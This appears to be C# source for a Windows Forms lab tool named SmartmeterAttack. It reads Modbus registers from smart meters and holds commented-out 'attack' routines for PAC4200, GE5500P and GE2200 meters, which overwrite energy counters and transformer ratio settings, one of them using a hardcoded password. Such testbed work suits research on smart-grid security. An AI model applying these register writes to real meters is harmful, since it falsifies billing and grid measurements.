using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Modbus.Device;
using Modbus.IO;
using Modbus.Data;
using log4net;
using log4net.Config;
using System.IO;
using System.Timers;

namespace SmartmeterAttack
{
    public partial class Form1 : Form
    {
        const int SampleTime1 = 1;
        const int SampleTime2 = 1;
        public TCPSGInterface TcpMeter1;
        bool bIsOpen = false;
        private System.Windows.Forms.Timer timer;
        private Random random=new Random();
        private byte[] res=new byte[20];
        public Form1()
        {
            InitializeComponent();
            timer = new System.Windows.Forms.Timer();
            timer.Interval = 500; // 设置定时器间隔为0.5秒
            timer.Tick += Timer_Tick;
            timer.Start();
            x = Width;
            y = Height;
            setTag(this);
        }
        private readonly float x; //定义当前窗体的宽度
        private readonly float y; //定义当前窗体的高度

        private void setTag(Control cons)
        {
            foreach (Control con in cons.Controls)
            {
                con.Tag = con.Width + ";" + con.Height + ";" + con.Left + ";" + con.Top + ";" + con.Font.Size;
                if (con.Controls.Count > 0) setTag(con);
            }
        }

        private void setControls(float newx, float newy, Control cons)
        {
            //遍历窗体中的控件，重新设置控件的值
            foreach (Control con in cons.Controls)
                //获取控件的Tag属性值，并分割后存储字符串数组
                if (con.Tag != null)
                {
                    var mytag = con.Tag.ToString().Split(';');
                    //根据窗体缩放的比例确定控件的值
                    con.Width = Convert.ToInt32(Convert.ToSingle(mytag[0]) * newx); //宽度
                    con.Height = Convert.ToInt32(Convert.ToSingle(mytag[1]) * newy); //高度
                    con.Left = Convert.ToInt32(Convert.ToSingle(mytag[2]) * newx); //左边距
                    con.Top = Convert.ToInt32(Convert.ToSingle(mytag[3]) * newy); //顶边距
                    var currentSize = Convert.ToSingle(mytag[4]) * newy; //字体大小                   
                    if (currentSize > 0) con.Font = new Font(con.Font.Name, currentSize, con.Font.Style, con.Font.Unit);
                    con.Focus();
                    if (con.Controls.Count > 0) setControls(newx, newy, con);

                }
        }

        /// <summary>
        /// 重置窗体布局
        /// </summary>
        private void ReWinformLayout()
        {
            var newx = Width / x;
            var newy = Height / y;
            setControls(newx, newy, this);

        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            ReWinformLayout();
        }
        unsafe private void Timer_Tick(object sender, EventArgs e)
        {
            float vv, cc, pp;
            byte*[] add = new byte*[5];
            if (bIsOpen)
            {
                TcpMeter1.ReadHoldingRegisters(0x01, 0x0131, 0x0001, res);
                vv = ((res[0] << 8) + res[1]) / (float)10.0;
                v_1.Text = vv.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x01, 0x0139, 0x0001, res);
                cc = ((res[0] << 8) + res[1]) / (float)1000.0;
                c_1.Text = cc.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x01, 0x0146, 0x0001, res);
                pp = ((res[0] << 8) + res[1]) / (float)1000.0;
                p_1.Text = pp.ToString("0.00");
                /////////////////////////////////////////////////////////////
                TcpMeter1.ReadHoldingRegisters(0x05, 0x0001, 0x0002, res);
                add[0] = (byte*)(&vv) + 3;
                add[1] = (byte*)(&vv) + 2;
                add[2] = (byte*)(&vv) + 1;
                add[3] = (byte*)(&vv);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                v_5.Text = vv.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x05, 13, 0x0002, res);
                add[0] = (byte*)(&cc) + 3;
                add[1] = (byte*)(&cc) + 2;
                add[2] = (byte*)(&cc) + 1;
                add[3] = (byte*)(&cc);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                c_5.Text = cc.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x05, 63, 0x0002, res);
                add[0] = (byte*)(&pp) + 3;
                add[1] = (byte*)(&pp) + 2;
                add[2] = (byte*)(&pp) + 1;
                add[3] = (byte*)(&pp);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                p_5.Text = pp.ToString("0.00");
                ////////////////////////////////////////////////////////////////////////////
                TcpMeter1.ReadHoldingRegisters(0x06, 0x0001, 0x0002, res);
                add[0] = (byte*)(&vv) + 3;
                add[1] = (byte*)(&vv) + 2;
                add[2] = (byte*)(&vv) + 1;
                add[3] = (byte*)(&vv);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                v_6.Text = vv.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x06, 13, 0x0002, res);
                add[0] = (byte*)(&cc) + 3;
                add[1] = (byte*)(&cc) + 2;
                add[2] = (byte*)(&cc) + 1;
                add[3] = (byte*)(&cc);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                c_6.Text = cc.ToString("0.00");
                TcpMeter1.ReadHoldingRegisters(0x06, 63, 0x0002, res);
                add[0] = (byte*)(&pp) + 3;
                add[1] = (byte*)(&pp) + 2;
                add[2] = (byte*)(&pp) + 1;
                add[3] = (byte*)(&pp);
                *add[0] = res[0];
                *add[1] = res[1];
                *add[2] = res[2];
                *add[3] = res[3];
                p_6.Text = pp.ToString("0.00");
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            
        }
        

        private void button1_Click(object sender, EventArgs e)
        {
            if (bIsOpen == false)//disconnect--->connect
            {
                try
                {
                    TcpMeter1 = new TCPSGInterface("192.168.1.254");
                    bIsOpen = true;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else
            {//conncet--->disconnect
                try
                {
                    TcpMeter1.close();
                    bIsOpen = false;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            button1.Text = bIsOpen ? "断开" : "电表连接";
            
        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        //攻击PAC4200
        private void button2_Click(object sender, EventArgs e)
        {

         /*
            double E11new =  500000;
            double E12new = 1500000;
            double E21new = 1500000;
            double E22new =  500000;
            
            byte[] bholdregs1 = new byte[8];
            byte[] bholdregs2 = new byte[8];
            byte[] bholdregs3 = new byte[8];
            byte[] bholdregs4 = new byte[8];
            bholdregs1 = BitConverter.GetBytes(E11new);
            Array.Reverse(bholdregs1, 0, 8);
            bholdregs2 = BitConverter.GetBytes(E12new);
            Array.Reverse(bholdregs2, 0, 8);
            bholdregs3 = BitConverter.GetBytes(E21new);
            Array.Reverse(bholdregs3, 0, 8);
            bholdregs4 = BitConverter.GetBytes(E22new);
            Array.Reverse(bholdregs4, 0, 8);
            TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
            TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
            TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);*/
           
        }

        //攻击GE5500P
        private void button3_Click(object sender, EventArgs e)
        {
            /*
            //ushort Pass = 5555; CT=25，PT1=220，PT2=220
            ushort CT1_1new = 25;
            UInt32 PT1_1new = 2200;
            ushort PT1_2new = 220;
            ushort CT2_1new = 250;
            UInt32 PT2_1new = 220;
            ushort PT2_2new = 220;
            byte slaveID1 = 7;
            byte slaveID2 = 8;

            byte[] bholdregs1_5 = new byte[4];
            byte[] bholdregs1_6 = new byte[2];
            byte[] bholdregs1_7 = new byte[2];
            byte[] bholdregs1_8 = new byte[4];
            byte[] bholdregs1_9 = new byte[2];
            byte[] bholdregs1_10 = new byte[2];
            bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
            Array.Reverse(bholdregs1_5, 0, 4);
            bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
            Array.Reverse(bholdregs1_6, 0, 2);
            bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
            Array.Reverse(bholdregs1_7, 0, 2);
            bholdregs1_8 = BitConverter.GetBytes(PT2_1new);
            Array.Reverse(bholdregs1_8, 0, 4);
            bholdregs1_9 = BitConverter.GetBytes(CT2_1new);
            Array.Reverse(bholdregs1_9, 0, 2);
            bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
            Array.Reverse(bholdregs1_10, 0, 2);
            TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
            TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);
            */

        }

        //攻击GE2200
        private void button4_Click(object sender, EventArgs e)
        {
            /*
            ushort Pass = 5555;
            ushort CT1new = 25;
            ushort PT1new = 240;
            ushort checksum;
            byte slaveID3 = 3;

            byte[] bholdregs11 = new byte[2];


            TcpMeter3.WriteSingleRegisters(slaveID3, 21999, Pass);// in PS update mode
            TcpMeter3.WriteSingleRegisters(slaveID3, 30000, CT1new);
            TcpMeter3.WriteSingleRegisters(slaveID3, 30001, PT1new);
            TcpMeter3.ReadHoldingRegisters(slaveID3, 22001, 1, bholdregs11);
            Array.Reverse(bholdregs11, 0, 2);
            checksum = BitConverter.ToUInt16(bholdregs11, 0);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode
            */

        }



        //重置PAC4200
        private void resetPAC4200()
        {
            double E11new = 1000000;
            double E12new = 1000000;
            double E21new = 1000000;
            double E22new = 1000000;

            byte[] bholdregs1 = new byte[8];
            byte[] bholdregs2 = new byte[8];
            byte[] bholdregs3 = new byte[8];
            byte[] bholdregs4 = new byte[8];


            bholdregs1 = BitConverter.GetBytes(E11new);
            Array.Reverse(bholdregs1, 0, 8);
            bholdregs2 = BitConverter.GetBytes(E12new);
            Array.Reverse(bholdregs2, 0, 8);
            bholdregs3 = BitConverter.GetBytes(E21new);
            Array.Reverse(bholdregs3, 0, 8);
            bholdregs4 = BitConverter.GetBytes(E22new);
            Array.Reverse(bholdregs4, 0, 8);


            TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
            TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
        }

        //重置GE5500P
        private void resetGE5500P()
        {
            ushort CT1_1new = 25;
            UInt32 PT1_1new = 220;
            ushort PT1_2new = 220;
            ushort CT2_1new = 25;
            UInt32 PT2_1new = 220;
            ushort PT2_2new = 220;
            byte slaveID1 = 7;
            byte slaveID2 = 8;

            byte[] bholdregs1_5 = new byte[4];
            byte[] bholdregs1_6 = new byte[2];
            byte[] bholdregs1_7 = new byte[2];
            byte[] bholdregs1_8 = new byte[4];
            byte[] bholdregs1_9 = new byte[2];
            byte[] bholdregs1_10 = new byte[2];

            bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
            Array.Reverse(bholdregs1_5, 0, 4);
            bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
            Array.Reverse(bholdregs1_6, 0, 2);
            bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
            Array.Reverse(bholdregs1_7, 0, 2);
            bholdregs1_8 = BitConverter.GetBytes(PT2_1new);
            Array.Reverse(bholdregs1_8, 0, 4);
            bholdregs1_9 = BitConverter.GetBytes(CT2_1new);
            Array.Reverse(bholdregs1_9, 0, 2);
            bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
            Array.Reverse(bholdregs1_10, 0, 2);

        }

        //resetGE2200
        private void resetGE2200()
        {
            ushort Pass = 5555;
            ushort CT1new = 25;
            ushort PT1new = 120;
            ushort checksum;
            byte slaveID3 = 3;

            byte[] bholdregs11 = new byte[2];

            Array.Reverse(bholdregs11, 0, 2);
            checksum = BitConverter.ToUInt16(bholdregs11, 0);
        }

        //重置所有电表
        private void button5_Click(object sender, EventArgs e)
        {
            //resetPAC4200();
            //resetGE5500P();
            //resetGE2200();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            //resetPAC4200();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {
           // resetGE5500P();
        }

        private void button8_Click(object sender, EventArgs e)
        {
           // resetGE2200();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }


        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox2_Enter_1(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox13_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox15_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {
            
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox23_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void v_1_TextChanged(object sender, EventArgs e)
        {

        }

        private void p_2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {

        }

        private void textBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox14_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
